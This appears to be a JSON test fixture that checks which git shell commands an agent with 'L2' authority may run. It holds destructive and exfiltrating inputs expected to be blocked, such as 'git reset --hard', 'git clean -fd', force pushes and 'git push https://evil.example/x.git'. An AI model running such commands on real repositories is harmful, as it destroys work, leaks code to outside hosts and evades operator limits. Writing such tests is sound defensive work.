{
  "about": "L2 orders: A without push, P with push; an origin remote exists.",
  "fixture": {
    "remote": true,
    "orders": [
      {
        "as": "A",
        "spec": {
          "authority": "L2"
        }
      },
      {
        "as": "P",
        "spec": {
          "authority": "L2",
          "push": true,
          "paths": [
            "p"
          ]
        },
        "push": true
      }
    ]
  },
  "cases": [
    {
      "name": "L3 git form: git reset --hard",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git reset --hard"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git clean -fd",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git clean -fd"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git rebase main",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git rebase main"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git merge main",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git merge main"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git branch -D main",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git branch -D main"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git tag v1",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git tag v1"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git config --global user.name x",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git config --global user.name x"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git checkout -b other",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git checkout -b other"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git worktree add ../x",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git worktree add ../x"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L3 git form: git remote add evil https://example.com/x.git",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git remote add evil https://example.com/x.git"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L2 without push permission",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push"
      },
      "cwd": "ws:A",
      "expect": "block"
    },
    {
      "name": "L2 commit",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git add -A && git commit -m x"
      },
      "cwd": "ws:A",
      "expect": "allow"
    },
    {
      "name": "push own branch",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push -u origin st/{wo:P}-corpus-p"
      },
      "cwd": "ws:P",
      "expect": "allow"
    },
    {
      "name": "push form: git push --force origin st/{wo:P}-corpus-p",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push --force origin st/{wo:P}-corpus-p"
      },
      "cwd": "ws:P",
      "expect": "block"
    },
    {
      "name": "push form: git push origin main",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push origin main"
      },
      "cwd": "ws:P",
      "expect": "block"
    },
    {
      "name": "push form: git push origin st/{wo:P}-corpus-p:main",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push origin st/{wo:P}-corpus-p:main"
      },
      "cwd": "ws:P",
      "expect": "block"
    },
    {
      "name": "push form: git push https://evil.example/x.git",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push https://evil.example/x.git"
      },
      "cwd": "ws:P",
      "expect": "block"
    },
    {
      "name": "push form: git push --all origin",
      "role": "tester",
      "tool": "shell",
      "input": {
        "command": "git push --all origin"
      },
      "cwd": "ws:P",
      "expect": "block"
    }
  ]
}
